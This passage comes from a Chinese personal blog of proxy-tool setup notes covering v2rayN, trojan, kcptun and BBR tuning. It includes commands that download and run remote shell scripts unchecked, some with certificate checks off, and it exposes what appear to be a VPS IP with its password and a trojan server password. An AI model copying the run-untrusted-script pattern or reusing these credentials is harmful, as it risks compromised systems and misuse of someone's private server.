我就是按要求安装的那个版本的框架，不起作用了，这个回答扯到系统，于是我把软件从虚拟机拖到主机发现就运行成功了。。。。。。我有点怀疑是之前抓包在系统里留的证书影响的。。。</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513151225071.png" alt="image-20210513151225071"></p><p>之后还是想把VM中的win7搞定，看了几个问题解决方案，感觉就像是NET版本的问题，决定把net升级一下，教程链接<a href="https://blog.csdn.net/richardfjf/article/details/108112229">https://blog.csdn.net/richardfjf/article/details/108112229</a> 这个教程涉及到系统的补丁，说是没有补丁高版本的NET框架就会报签名的错。。。</p><p>成功了！</p><p>安装完上面那个win7补丁后NET4.7.3081.0版本就能顺利安装上了，然后v2rayN也能正常运行了，和主机一样可以使用。</p><hr><h5 id="宿主机win10-x64尝试"><a href="#宿主机win10-x64尝试" class="headerlink" title="宿主机win10 x64尝试:"></a>宿主机win10 x64尝试:</h5><p>在主机上直接运行<a href="https://github.com/2dust/v2rayN/releases/tag/4.15%E4%B8%ADv2rayN-core%E7%89%88%E6%9C%AC%E7%9A%84%EF%BC%8C%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E7%81%AB%E7%8B%90%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%EF%BC%8Cv2ray-core%E4%BD%BF%E7%94%A8%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E3%80%82">https://github.com/2dust/v2rayN/releases/tag/4.15中v2rayN-core版本的，配置服务器，火狐默认使用系统代理，v2ray-core使用自动配置系统代理。</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513152657060.png" alt="image-20210513152657060"></p><hr><p>关于trojanWin，就像电脑版的Igniter一样的木马图标</p><p>资源链接：<a href="https://github.com/rkzrdm/TrojanWin">https://github.com/rkzrdm/TrojanWin</a> 但是貌似只是把trojan.exe装了个UI界面，没什么用</p><p>tips：蓝灯开启后，火狐使用的是系统代理。这里trojan一直怀疑需要手动配置socks5代理</p><hr><h4 id="Android："><a href="#Android：" class="headerlink" title="Android："></a>Android：</h4><p>lgnite</p><p>安卓端使用lgniter或者v2rayNG_1.6.28_arm64-v8a.apk</p><p><a href="https://github.com/trojan-gfw/igniter/releases">https://github.com/trojan-gfw/igniter/releases</a> </p><p>trojan的github资源：</p><p><a href="https://github.com/trojan-gfw/trojan/wiki/Mobile-Platforms">https://github.com/trojan-gfw/trojan/wiki/Mobile-Platforms</a></p><p><a href="https://github.com/trojan-gfw/igniter/releases/tag/v0.10.3-beta">https://github.com/trojan-gfw/igniter/releases/tag/v0.10.3-beta</a></p><pre><code>Enable IPv6：是否支持 IPv6，国内用户支持 IPv6 的终端较少，启用不启用关系大Verify Certificate：是否验证证书，默认是打开的，对于自签名的服务器，建议关闭此项Bypass China with Clash：是否通过 Clash 优化绕过中国网络的样子，因为没仔细研究其优化策略，也不好说是否有效，建议使用默认开启即可关于igniter:   https://www.rultr.com/tutorials/vps/3825.html</code></pre><p>但是！</p><p>使用lgniter测试成功，ip地址待验证，验证结果很不幸，不知道为什么，手机挂了Igniter之后从ip138查到的ip地址是一样的。。。</p><p>不过话说回来，手机IP也应该是运营商基站根据DHCP这种类似的协议进行动态ip分配的，所以理论上可以通过打开飞行模式再关闭，或者换一个基站，就变ip了？（待测试）</p><h5 id="v2ray"><a href="#v2ray" class="headerlink" title="v2ray"></a>v2ray</h5><p>比较好用，支持reality</p><p><a href="https://zhuanlan.zhihu.com/p/599065241">https://zhuanlan.zhihu.com/p/599065241</a> google play安装方式</p><hr><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h4><h5 id="ubuntu18"><a href="#ubuntu18" class="headerlink" title="ubuntu18"></a>ubuntu18</h5><p>trojan-v1.16.0</p><p>客户端必须配合socks5使用，http，https等代理不要填，chrome使用omega方便管理</p><p><a href="https://github.com/trojan-gfw/trojan/issues/519">https://github.com/trojan-gfw/trojan/issues/519</a></p><p><strong>直接使用后面自用一键脚本</strong></p><h5 id="ubuntu20及以上"><a href="#ubuntu20及以上" class="headerlink" title="ubuntu20及以上"></a>ubuntu20及以上</h5><p>使用clash-verge</p><p>下载clash-verge_1.5.11_amd64.deb，适用于ubuntu20以上，ubuntu18及以下使用trojan-gfw官方的trojan的client终端</p><p>clash-verge: 使用订阅链接，但是似乎不支持自定义配置<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases">https://github.com/clash-verge-rev/clash-verge-rev/releases</a></p><p><a href="https://github.com/233boy/v2ray/tree/master">https://github.com/233boy/v2ray/tree/master</a></p><h5 id="安装deb包的问题"><a href="#安装deb包的问题" class="headerlink" title="安装deb包的问题"></a>安装deb包的问题</h5><p>在linux上安装deb软件可能会遇到的问题，理论上顺利的话在gui界面双击即可顺利安装（实测在虚拟机ubuntu20.04上是的）</p><ul><li><p>deb文件执行权限</p></li><li><p>双击安装时发现安装包大小为0KB，但是文件资源管理器中查看确实是正常大小。这是deb包control文件中dinstalled-size字段有问题，问题不大，可以使用命令行安装</p></li><li><p>依赖缺失，参考下列命令</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i xxx.deb  <span class="comment"># 解压安装包，这一步会抛出可能缺少的依赖</span></span><br><span class="line">apt-get install 缺失依赖，或者使用-f参数修复</span><br><span class="line">apt install -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo apt install gdebi <span class="comment">#gdebi会自动处理缺失依赖包</span></span><br><span class="line">wget -c url<span class="comment"># 大部分软件都可以直接从官网下载deb安装</span></span><br><span class="line">sudo gdebi package_name.deb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#卸载</span></span><br><span class="line">sudo apt list --installed | grep appname</span><br><span class="line">sudo apt remove program_name</span><br><span class="line">dpkg -l | grep grid <span class="comment">#用dpkg也行</span></span><br><span class="line">dpkg -r program_name</span><br></pre></td></tr></table></figure><h4 id="mac："><a href="#mac：" class="headerlink" title="mac："></a>mac：</h4><p>西部世界，小火箭id.chat444.com共享小火箭，tg群也有不定期共享</p><p>sing-box(全平台) hy2配置参考<a href="https://www.youtube.com/watch?v=N6j3gWde8cQ">https://www.youtube.com/watch?v=N6j3gWde8cQ</a></p><p>v2box-reality vless</p><p><a href="https://www.datacenterfarm.com/3254.html">https://www.datacenterfarm.com/3254.html</a></p><h4 id="ios："><a href="#ios：" class="headerlink" title="ios："></a>ios：</h4><p>小火箭</p><p><a href="https://xtrojan.pro/client/get-proxy-clients.html">https://xtrojan.pro/client/get-proxy-clients.html</a></p><p><a href="https://xiaohuojian.link/">https://xiaohuojian.link/</a></p><hr><h2 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h2><h3 id="BBR加速"><a href="#BBR加速" class="headerlink" title="BBR加速"></a>BBR加速</h3><hr><p>分割线，240408更新</p><p>没使用任何加速的时候最多就1443kbps这样,平均在700kbps北京时间中午。（这是mac上的数据，奇怪的是为什么主力win还是能跑到加速后的效果。。。）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408123509054.png" alt="image-20240408123509054"></p><p>简而言之，BBR是谷歌开发出的用来加速的，之后出现了魔改BBR，BBR Plus等版本，达到压榨VPS带宽潜力的效果。</p><p>需要注意的是得用兼容OpenVZ架构的BBR加速脚本，nanqinglang的可以，只需要把脚本里的<strong>check OVZ那个有问题的函数注释掉</strong>即可</p><p><a href="https://github.com/tcp-nanqinlang/wiki/wiki/lkl-rinetd">https://github.com/tcp-nanqinlang/wiki/wiki/lkl-rinetd</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/tcp-nanqinlang/lkl-rinetd/releases/download/1.1.0/tcp_nanqinlang-rinetd-debianorubuntu.sh</span><br><span class="line">bash tcp_nanqinlang-rinetd-debianorubuntu.sh</span><br></pre></td></tr></table></figure><p>参考<a href="https://sometimesnaive.org/article/63#no-check-virt">https://sometimesnaive.org/article/63#no-check-virt</a></p><p>对于内核4.9以上的linux，内核内置了bbr加速，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.default_qdisc=fq&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.tcp_congestion_control=bbr&quot;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><p>如果内核没有，参考以下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>在加载4K视频的时候效果反而比低请视频好，因为连续的大数据量可以触发BBR加速，这里可以跑到177Mbps=20MB/s，但是奇怪的是为什么mac上测试还是1mbps。。。不对，这里应该是win的kcp速度，我总带宽也就100mbps。。。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408124124252.png" alt="image-20240408124124252"></p><hr><p>bbr加速后mac资源管理器查看峰值达到8MB/s，相当于64mbps，4Kyoutube是很丝滑流畅的，一点不卡。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408160057140.png" alt="image-20240408160057140"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408160628061.png" alt="image-20240408160628061"></p><p>服务器bbr配置也很简单：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408160330686.png" alt="image-20240408160330686"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408160238729.png" alt="image-20240408160238729"></p><p>mac这里没有kcp客户端，所以直接使用的443端口的bbr加速</p><h4 id="说说优缺点"><a href="#说说优缺点" class="headerlink" title="说说优缺点"></a>说说优缺点</h4><p>类似于冷启动，只有大量数据的时候才会触发BBR，</p><p>好处是服务器单端加速，不需要客户端。</p><hr><p>分割线(旧版，用于debian10)</p><p>1、不同版本BBR加速效果对比视频链接<a href="https://www.youtube.com/watch?v=YOxKxVhiyUY">https://www.youtube.com/watch?v=YOxKxVhiyUY</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">视频中搬瓦工VPS：http:&#x2F;&#x2F;bit.ly&#x2F;3ckoUov</span><br><span class="line">自用搬瓦工机场：http:&#x2F;&#x2F;bit.ly&#x2F;387YRNP</span><br><span class="line"></span><br><span class="line">BBR一键安装脚本：https:&#x2F;&#x2F;www.94ish.me&#x2F;1635.html</span><br><span class="line">支持系统 Centos 6+ &#x2F; Debian 7+ &#x2F; Ubuntu 14+ BBR魔改版不支持Debian 8</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span></span><br><span class="line">chmod +x tcp.sh</span><br><span class="line">./tcp.sh</span><br><span class="line"></span><br><span class="line">运行脚本代码</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513202631837.png" alt="image-20210513202631837"></p><p><a href="https://www.94ish.me/1635.html">https://www.94ish.me/1635.html</a>   上面脚本代码出处</p><p>默认开启了BBR，这里尝试使用了BBRplus，貌似没啥效果，youtube看4k还是卡。。。</p><h3 id="trojan原理"><a href="#trojan原理" class="headerlink" title="trojan原理"></a>trojan原理</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513150811423.png" alt="image-20210513150811423"></p><p>相关文档 <a href="https://p4gefau1t.github.io/trojan-go/">https://p4gefau1t.github.io/trojan-go/</a></p><h3 id="KCP加速"><a href="#KCP加速" class="headerlink" title="KCP加速"></a>KCP加速</h3><p>部署原理</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20220422184745820.png" alt="image-20220422184745820"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20220422184800629.png" alt="image-20220422184800629"></p><p>参考：<a href="https://www.likecs.com/show-1019259.html">https://www.likecs.com/show-1019259.html</a></p><h4 id="kcptun使用"><a href="#kcptun使用" class="headerlink" title="kcptun使用"></a>kcptun使用</h4><p><a href="https://v2cross.com/archives/2805">https://v2cross.com/archives/2805</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://github.com/kuoruan/shell-scripts/raw/master/kcptun/kcptun.sh #适用于OVZ，KVM，Xen等架构CentOS，Debian，Ubuntu等</span><br><span class="line">chmod +x ./kcptun.sh</span><br><span class="line">./kcptun.sh</span><br></pre></td></tr></table></figure><h4 id="客户端下载"><a href="#客户端下载" class="headerlink" title="客户端下载"></a>客户端下载</h4><p><a href="https://github.com/xtaci/kcptun/releases">https://github.com/xtaci/kcptun/releases</a></p><p>使用教程参考<a href="https://v2cross.com/archives/2793">https://v2cross.com/archives/2793</a></p><h4 id="kcptun参数优化"><a href="#kcptun参数优化" class="headerlink" title="kcptun参数优化"></a>kcptun参数优化</h4><p>优化前还是卡顿，只有7000kbps晚上</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408223218909.png" alt="image-20240408223218909"></p><p>优化参考<a href="https://www.cnblogs.com/findumars/p/5794040.html">https://www.cnblogs.com/findumars/p/5794040.html</a></p><p>更深层次的参数调整需要理解 KCP 协议，并通过“隐藏参数”调整。巭孬嫑乱动</p><p>下面是作者给的配置参数样例，适用大部分ADSL接入（非对称上下行）的参数（实验环境<strong>电信100M ADSL</strong>）。其它带宽请按比例调整，比如 50M ADSL，把 CLIENT 的 -sndwnd -rcvwnd 减掉一半，SERVER 不变。</p><table><thead><tr><th></th><th>服务端:  -mtu 1400 -sndwnd 2048 -rcvwnd 2048 -mode fast2</th></tr></thead><tbody><tr><td></td><td><strong>客户端:  -mtu 1400 -sndwnd 256 -rcvwnd 2048 -mode fast2 -dscp 46</strong></td></tr></tbody></table><p>带宽计算公式：</p><p>在不丢包的情况下，有最大-rcvwnd 个数据包在网络上正在向你传输，以平均数据包大小avgsize计算，在任意时刻，有：<br>network_cap = rcvwnd<em>avgsize<br>数据流向你，这个值再除以ping值(rtt)，等于最大带宽使用量。<br>max_bandwidth = network_cap/rtt = rcvwnd</em>avgsize/rtt<br>举例，设rcvwnd = 1024, avgsize = 1KB, rtt = 400ms，则：<br>max_bandwidth = 1024 * 1KB / 400ms = 2.5MB/s ~= 25Mbps<br>（注：以上计算不包括前向纠错的数据量）<br>前向纠错是最大带宽量的一个固定比例增加：<br>max_bandwidth_fec = max_bandwidth*(datashard+parityshard)/datashard<br>举例，设datashard = 10 , partiyshard = 3，则：<br>max_bandwidth_fec = max_bandwidth * (10 + 3) /10 = 1.3*max_bandwidth ＝ 1.3 * 25Mbps = 32.5Mbps</p><p>看不懂？那就别管它，你只要会简易自我调优方法就够了：</p><ol><li>同时在两端逐步增大 client rcvwnd 和 server sndwnd;</li><li>尝试下载，观察如果带宽利用率（服务器＋客户端两端都要观察）接近物理带宽则停止，否则跳转到第一步。<br>基本原则：SERVER 的发送速率不能超过 ADSL 下行带宽，否则只会浪费您的服务器带宽。</li></ol><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408224718737.png" alt="image-20240408224718737"></p><p>局域网pc开热点把有线变wifi和手机组网，手机小火箭连pc的socks代理同样可以达到间接使用kcp的效果</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20240408235731213.png" alt="image-20240408235731213"></p><h5 id="MacOS上的kcptun客户端"><a href="#MacOS上的kcptun客户端" class="headerlink" title="MacOS上的kcptun客户端"></a>MacOS上的kcptun客户端</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./client_darwin_arm64 -r &quot;l*****.***e:29900&quot; -l &quot;:11443&quot; --key very_fast --crypt none -mode fast3 -mtu 1350 -sndwnd 1024 -rcvwnd 1024 -dscp 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意，最好保持kcptun客户端和服务端的版本相同</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 说明</span></span><br><span class="line">-dscp 服务端可以和客户端不同，服务端可以为0，客户端可以为46</span><br><span class="line">--nocomp 加上后compresion会变为：false，这个必须与服务端相同，否则incurpt错误</span><br><span class="line">-sndwnd和 -rcvwnd可以和服务端不同，这两项属于调优参数，客户端-sndwnd优先256，100M带宽下，-rcvwnd需要和服务端相同利用率最高。</span><br><span class="line">-r 域名和ip没影响，端口一点要和kcptun对应的上</span><br><span class="line">-mode和 --mode前面一个-和两个-效果一样，实测没影响，除非fast和fast3互相兼容或者存在包含兼容关系</span><br><span class="line">--crypt必须要和服务端相同，实测aes加密好像有问题，目前双方none是没问题的</span><br></pre></td></tr></table></figure><p>conda 23.5.2</p><p>Python 3.11.3</p><h2 id="Trojan多用户面板和X-UI"><a href="#Trojan多用户面板和X-UI" class="headerlink" title="Trojan多用户面板和X-UI"></a>Trojan多用户面板和X-UI</h2><p><a href="https://v2cross.com/archives/2233">https://v2cross.com/archives/2233</a></p><h2 id="Trojan-go-kcp"><a href="#Trojan-go-kcp" class="headerlink" title="Trojan-go + kcp"></a>Trojan-go + kcp</h2><p>E: Repository ‘<a href="http://deb.debian.org/debian">http://deb.debian.org/debian</a> buster-updates InRelease’ changed its ‘Suite’ value from ‘stable-updates’ to ‘oldoldstable-updates’ N: This must be accepted explicitly before updates for this repository can be applied. See apt-secure(8) manpage for details.这个问题是因为 Debian Buster 已经不再是稳定版本，可以通过以下步骤解决这个问题：</p><p>sudo apt-get update –allow-releaseinfo-change</p><p>安装trojan-go官方文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;run_type&quot;:</span> <span class="string">&quot;server&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;local_addr&quot;:</span> <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;local_port&quot;:</span> <span class="number">4433</span>, <span class="comment"># trojan默认443和80，但是可以改，客户端访问这个就行，或者套一层kcp</span></span><br><span class="line">    <span class="attr">&quot;remote_addr&quot;:</span> <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;remote_port&quot;:</span> <span class="number">80</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;:</span> [</span><br><span class="line"><span class="string">&quot;liloker@Passw0rd.haah&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;buffer_size&quot;:</span> <span class="number">32</span>,</span><br><span class="line">    <span class="attr">&quot;dns&quot;:</span> [<span class="string">&quot;8.8.8.8&quot;</span>],</span><br><span class="line">    <span class="attr">&quot;ssl&quot;:</span> &#123;</span><br><span class="line"><span class="attr">&quot;verify&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;verity_hostname&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;cert&quot;:</span> <span class="string">&quot;/usr/local/etc/trojan/cert.crt&quot;</span>, <span class="comment">#这里一定要写，trojan原理依靠证书加密，证书需要续签，使用trojan1，2脚本续签即可，路径放这里</span></span><br><span class="line">        <span class="attr">&quot;key&quot;:</span> <span class="string">&quot;/usr/local/etc/trojan/private.key&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;key_password&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;cipher&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;cipher_tls13&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;curves&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;prefer_server_cipher&quot;:</span> <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;sni&quot;:</span> <span class="string">&quot;github.com&quot;</span>, <span class="comment"># 伪装</span></span><br><span class="line"><span class="attr">&quot;alpn&quot;:</span> [</span><br><span class="line">   <span class="string">&quot;http/1.1&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;session_ticket&quot;:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;reuse_session&quot;:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;plain_http_response&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;fallback_port&quot;:</span> <span class="number">443</span>,</span><br><span class="line"><span class="attr">&quot;fingerprint&quot;:</span> <span class="string">&quot;firefox&quot;</span>,</span><br><span class="line"><span class="attr">&quot;serve_plain_text&quot;:</span> <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;tcp&quot;:</span> &#123;</span><br><span class="line"><span class="attr">&quot;no_delay&quot;:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;keep_alive&quot;:</span> <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;reuse_port&quot;:</span> <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;prefer_ipv4&quot;:</span> <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;fast_open&quot;:</span> <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;fast_open_qlen&quot;:</span> <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;router&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;enabled&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;block&quot;:</span> [</span><br><span class="line">            <span class="string">&quot;geoip:private&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;geoip&quot;:</span> <span class="string">&quot;/usr/share/trojan-go/geoip.dat&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;geosite&quot;:</span> <span class="string">&quot;/usr/share/trojan-go/geosite.dat&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接运行kcptun.sh脚本即可</p><p>对于RN服务端发送窗口15360 服务端接收窗口10240，速度会上下行30mbps左右，但是流量消耗极大，几分钟高清视频就10G服务端流量，测试调优到8192和4096，比较均衡</p><p>对于VM服务器还是先测试2048和2048</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>资源敏感，不外放了。</p><p>本文的所有教程与代码均收集于网络，仅作为学习过程的一种积累，切忌不可用于商业用途或用于干违反法律的奇奇怪怪的事情，转载需获得作者允许，否则保持追究权利。</p><h2 id="维护记录"><a href="#维护记录" class="headerlink" title="维护记录"></a>维护记录</h2><p>20210703</p><p><a href="http://www.v2rayssr.com/">www.v2rayssr.com</a> 波仔分享</p><p><a href="http://port.ping.pe/">http://port.ping.pe</a> 查看端口有没有被ban</p><p>45.77.194.230         cP)82bVBF*8uQ48-</p><p><a href="https://www.youtube.com/watch?v=hWZKbaV3xDk">https://www.youtube.com/watch?v=hWZKbaV3xDk</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210703184307999.png" alt="image-20210703184307999"></p><h3 id="手动申请证书"><a href="#手动申请证书" class="headerlink" title="手动申请证书"></a>手动申请证书</h3><p>利用网站 <strong>port.ping.pe</strong> 对vps的ip进行测试，全绿，ip没被ban，ip:80 http端口全绿，https443端口全红，结合上述第二步出现问题，第一步trojan脚本已成功打开http域名主页，说明很可能是证书问题导致的https请求不成功。</p><p>配置https</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210703185038660.png" alt="image-20210703185038660"></p><p>freessl.cn国内需要手机验证，可用国际版freessl.org</p><p>参考教程 <a href="https://zhuanlan.zhihu.com/p/29421815">https://zhuanlan.zhihu.com/p/29421815</a></p><p>使用keymanager离线生成CSR证书签名请求，参考<a href="https://zhuanlan.zhihu.com/p/65178284">https://zhuanlan.zhihu.com/p/65178284</a> 下载地址<a href="https://www.keymanager.org/#">https://www.keymanager.org/#</a></p><p>创建CSR时的通用名要与freessl.org中输入的域名一致，否则报证书内容filled不匹配错</p><h4 id="sslforfree"><a href="#sslforfree" class="headerlink" title="sslforfree"></a>sslforfree</h4><p><strong>如果是debian11，默认apache2服务需要stop和disable，否则nginx配置不了脚本报错也会导致证书签发错误</strong></p><p>应该是freessl出问题了，cn国内要手机，org总是失败，找不到原因，索性寻找别的申请证书服务商，<a href="https://zhuanlan.zhihu.com/p/174755007">https://zhuanlan.zhihu.com/p/174755007</a> 最后在<strong>sslforfree.com成功申请到</strong>了证书，用的http验证，期间遇到503错误，将服务器关机重启解决（23年1月17日实测sslforfree屏蔽了部分十分钟邮箱，183@ Passw0rd 有3次90天证书）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210708162042226.png" alt="image-20210708162042226"></p><p>前面一键部署脚本中，网站安装目录/usr/share/nginx/html</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210708161829022.png" alt="image-20210708161829022"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210708132301973.png" alt="image-20210708132301973"></p><hr><ul><li>当证书3个月失效之后，systemctl restart trojan会出现active：failed   trojan failed with exit code并且指向trojan的config.json文件</li><li>证书更新后，最好重新运行一下trojan3.sh 之后restart服务</li></ul><p>拿到证书后根据第二步放到指定目录，改名，安装完成</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210703185227505.png" alt="image-20210703185227505"></p><h3 id="http-amp-https-amp-证书-amp-中间人攻击"><a href="#http-amp-https-amp-证书-amp-中间人攻击" class="headerlink" title="http&amp;https&amp;证书&amp;中间人攻击"></a>http&amp;https&amp;证书&amp;中间人攻击</h3><p>http的香维护，对https理解更深入了一层，参考链接 看完还不懂HTTPS我直播吃翔 - winwill2012的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/25976060">https://zhuanlan.zhihu.com/p/25976060</a> 经过思考做出的笔记如下图</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/00B2798EC60D3EE3EBAE71E82E6B9C3C.jpg" alt="img"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/6AC30F5D5FCEC11153B82838A2D96410.jpg" alt="img"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/FE34E6651440FC1825B80DED19ED387D.jpg" alt="img"></p><p>同时，在寻找临时翻墙软件时，github上有个freefq的，nice，直接订阅，已经fork了，也有手机版的v2rayN了，真香！</p><hr><p>tempVPS：迈阿密e130c4d5</p><p>liloker: 45.32.170.65</p><p>第一代：韩</p><p><img 